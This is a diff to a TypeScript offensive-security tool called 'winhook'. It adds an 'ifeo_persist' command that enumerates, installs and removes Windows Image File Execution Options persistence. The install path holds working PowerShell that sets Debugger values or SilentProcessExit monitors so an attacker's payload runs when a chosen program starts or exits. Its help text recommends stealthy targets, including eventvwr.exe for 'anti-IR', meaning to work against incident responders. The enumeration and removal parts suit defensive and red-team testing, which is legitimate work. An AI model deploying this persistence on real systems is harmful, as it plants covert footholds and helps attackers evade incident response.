@@ -23831,6 +23831,226 @@ Write-Output "[+] Backdoor removed"
   return { output: output.join("\n"), findings }
 }
 
+async function ifeoPersist(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const targetProc = argVal(args, "--target")
+  const payloadPath = argVal(args, "--payload")
+  const method = argVal(args, "--method") || "debugger"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] IFEO (Image File Execution Options) persistence...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== IFEO Entries ==="
+Write-Output ""
+
+$ifeoRoot = 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options'
+$entries = Get-ChildItem $ifeoRoot -ErrorAction SilentlyContinue
+
+$debuggerCount = 0
+$silentCount = 0
+
+foreach ($entry in $entries) {
+  $debugger = (Get-ItemProperty $entry.PSPath -Name Debugger -ErrorAction SilentlyContinue).Debugger
+  $globalFlag = (Get-ItemProperty $entry.PSPath -Name GlobalFlag -ErrorAction SilentlyContinue).GlobalFlag
+
+  if ($debugger) {
+    $debuggerCount++
+    Write-Output "[!] $($entry.PSChildName)"
+    Write-Output "    Debugger: $debugger"
+    Write-Output "    Type: IFEO Debugger (runs payload INSTEAD of target)"
+    Write-Output ""
+  }
+
+  if ($globalFlag -eq 512) {
+    $silentCount++
+    # Check SilentProcessExit monitoring
+    $silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\$($entry.PSChildName)"
+    $monitor = Get-ItemProperty $silentKey -ErrorAction SilentlyContinue
+    if ($monitor) {
+      Write-Output "[!] $($entry.PSChildName)"
+      Write-Output "    GlobalFlag: 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)"
+      Write-Output "    MonitorProcess: $($monitor.MonitorProcess)"
+      Write-Output "    ReportingMode: $($monitor.ReportingMode)"
+      Write-Output "    Type: SilentProcessExit (runs payload WHEN target exits)"
+      Write-Output ""
+    }
+  }
+}
+
+Write-Output "DEBUGGER_COUNT=$debuggerCount"
+Write-Output "SILENT_COUNT=$silentCount"
+Write-Output ""
+Write-Output "Total IFEO entries: $($entries.Count)"
+Write-Output "With Debugger: $debuggerCount"
+Write-Output "With SilentProcessExit: $silentCount"
+
+if ($debuggerCount -gt 0 -or $silentCount -gt 0) {
+  Write-Output ""
+  Write-Output "[!] Suspicious IFEO entries found — possible persistence or debugging"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const debuggerCount = r.stdout.match(/DEBUGGER_COUNT=(\d+)/)
+    const silentCount = r.stdout.match(/SILENT_COUNT=(\d+)/)
+    const total = (debuggerCount ? parseInt(debuggerCount[1]) : 0) + (silentCount ? parseInt(silentCount[1]) : 0)
+
+    if (total > 0) {
+      findings.push({
+        checkId: "WIN-IFEO-001",
+        provider: "windows",
+        severity: "high",
+        status: "SUSPICIOUS",
+        resource: "registry://ifeo",
+        title: `${total} IFEO persistence entries found (${debuggerCount ? debuggerCount[1] : 0} debugger, ${silentCount ? silentCount[1] : 0} silent exit)`,
+        details: "IFEO entries can redirect process execution or trigger payloads on process exit. Review for malicious entries.",
+        remediation: "Remove suspicious Debugger values and SilentProcessExit monitoring.",
+      })
+    }
+  }
+
+  if (action === "install") {
+    if (!targetProc || !payloadPath) {
+      output.push("ERROR: --target and --payload required")
+      output.push("")
+      output.push("--target: Process name to intercept (e.g., notepad.exe, calc.exe)")
+      output.push("--payload: Path to payload executable")
+      output.push("")
+      output.push("Methods:")
+      output.push("  --method debugger      — Payload runs INSTEAD of target (visible)")
+      output.push("  --method silent-exit   — Payload runs WHEN target exits (stealthier)")
+      output.push("")
+      output.push("Good targets for persistence:")
+      output.push("  notepad.exe  — commonly opened by users and admins")
+      output.push("  mmc.exe      — opened when launching management consoles")
+      output.push("  eventvwr.exe — opened during incident response (anti-IR)")
+      return { output: output.join("\n"), findings }
+    }
+
+    if (method === "debugger") {
+      const script = `
+Write-Output "=== Installing IFEO Debugger ==="
+Write-Output "Target: ${targetProc}"
+Write-Output "Payload: ${payloadPath}"
+Write-Output ""
+
+$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
+New-Item -Path $ifeoKey -Force | Out-Null
+Set-ItemProperty $ifeoKey -Name Debugger -Value '${payloadPath}' -Type String
+
+$verify = (Get-ItemProperty $ifeoKey -Name Debugger).Debugger
+Write-Output "[+] IFEO Debugger set: ${targetProc} -> $verify"
+Write-Output ""
+Write-Output "[*] When any user runs ${targetProc}, the payload executes instead"
+Write-Output "[*] The payload receives the original command line as arguments"
+Write-Output "[!] The original ${targetProc} does NOT run (may be noticed)"
+Write-Output ""
+Write-Output "Cleanup: winhook ifeo_persist --action remove --target ${targetProc}"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (method === "silent-exit") {
+      const script = `
+Write-Output "=== Installing SilentProcessExit Monitor ==="
+Write-Output "Target: ${targetProc}"
+Write-Output "Payload: ${payloadPath}"
+Write-Output ""
+Write-Output "[*] This is STEALTHIER than debugger method:"
+Write-Output "    - Target process runs NORMALLY"
+Write-Output "    - Payload triggers only AFTER target exits"
+Write-Output "    - Less likely to be noticed by the user"
+Write-Output ""
+
+# Set GlobalFlag for the target process
+$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
+New-Item -Path $ifeoKey -Force | Out-Null
+Set-ItemProperty $ifeoKey -Name GlobalFlag -Value 512 -Type DWord  # FLG_MONITOR_SILENT_PROCESS_EXIT (0x200)
+
+# Configure SilentProcessExit monitoring
+$silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}"
+New-Item -Path $silentKey -Force | Out-Null
+Set-ItemProperty $silentKey -Name ReportingMode -Value 1 -Type DWord  # LAUNCH_MONITORPROCESS
+Set-ItemProperty $silentKey -Name MonitorProcess -Value '${payloadPath}' -Type String
+
+Write-Output "[+] GlobalFlag set to 0x200 (FLG_MONITOR_SILENT_PROCESS_EXIT)"
+Write-Output "[+] MonitorProcess: ${payloadPath}"
+Write-Output ""
+Write-Output "[*] Flow: User opens ${targetProc} -> uses normally -> closes it -> payload runs"
+Write-Output "[*] Payload runs in the context of WerFault.exe (needs Windows Error Reporting)"
+Write-Output ""
+Write-Output "Cleanup: winhook ifeo_persist --action remove --target ${targetProc}"
+Write-Output "STATUS=SUCCESS"
+`
+      const r = await ps(script, timeout)
+      output.push(r.stdout)
+    }
+
+    if (output.some(o => o.includes("STATUS=SUCCESS"))) {
+      findings.push({
+        checkId: "WIN-IFEO-010",
+        provider: "windows",
+        severity: "critical",
+        status: "PERSISTED",
+        resource: `ifeo://${targetProc}`,
+        title: `IFEO persistence installed: ${targetProc} → ${payloadPath} (${method})`,
+        details: `${method === "debugger" ? "Payload runs instead of target" : "Payload triggers on target exit (stealthier)"}. Persists across reboots.`,
+        remediation: `Remove: winhook ifeo_persist --action remove --target ${targetProc}`,
+      })
+    }
+  }
+
+  if (action === "remove") {
+    if (!targetProc) {
+      output.push("ERROR: --target required (process name to clean)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const script = `
+Write-Output "=== Removing IFEO Persistence ==="
+
+# Remove debugger
+$ifeoKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\${targetProc}"
+$debugger = (Get-ItemProperty $ifeoKey -Name Debugger -ErrorAction SilentlyContinue).Debugger
+if ($debugger) {
+  Remove-ItemProperty $ifeoKey -Name Debugger -Force
+  Write-Output "[+] Debugger removed for ${targetProc}"
+}
+
+# Remove GlobalFlag
+$gf = (Get-ItemProperty $ifeoKey -Name GlobalFlag -ErrorAction SilentlyContinue).GlobalFlag
+if ($gf) {
+  Remove-ItemProperty $ifeoKey -Name GlobalFlag -Force
+  Write-Output "[+] GlobalFlag removed for ${targetProc}"
+}
+
+# Remove SilentProcessExit
+$silentKey = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\${targetProc}"
+if (Test-Path $silentKey) {
+  Remove-Item $silentKey -Recurse -Force
+  Write-Output "[+] SilentProcessExit monitoring removed for ${targetProc}"
+}
+
+# Clean up empty IFEO key
+$remaining = Get-ItemProperty $ifeoKey -ErrorAction SilentlyContinue
+if (-not $remaining.Debugger -and -not $remaining.GlobalFlag) {
+  Remove-Item $ifeoKey -Force -ErrorAction SilentlyContinue
+  Write-Output "[+] Empty IFEO key removed"
+}
+
+Write-Output "[+] All IFEO persistence removed for ${targetProc}"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -27473,6 +27693,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   dsrm_abuse: dsrmAbuse,
   ntlmv1_downgrade: ntlmv1Downgrade,
   accessibility_backdoor: accessibilityBackdoor,
+  ifeo_persist: ifeoPersist,
 }
 
 export const WinhookTool = Tool.define("winhook", {
